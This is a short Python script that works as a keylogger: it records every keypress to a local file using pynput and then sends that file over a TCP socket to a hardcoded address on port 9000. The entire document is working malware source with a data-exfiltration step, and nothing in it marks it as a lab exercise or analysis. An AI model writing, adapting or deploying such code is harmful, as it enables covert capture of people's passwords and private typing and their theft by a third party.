from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key) + '\n')
            print(f"Key pressed: {key}")  # Debug print statement for key presses
    except Exception as e:
        print(f"Error logging keypress: {e}")

def transmit_file():
    try:
        with open('keylogs.txt', 'rb') as f:
            data = f.read()
            
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('192.168.122.182', 9000))
        client.sendall(data)
        
        print("File transmitted successfully")  # Debug print statement for file transmission
    except Exception as e:
        print(f"Error transmitting file: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
transmit_file()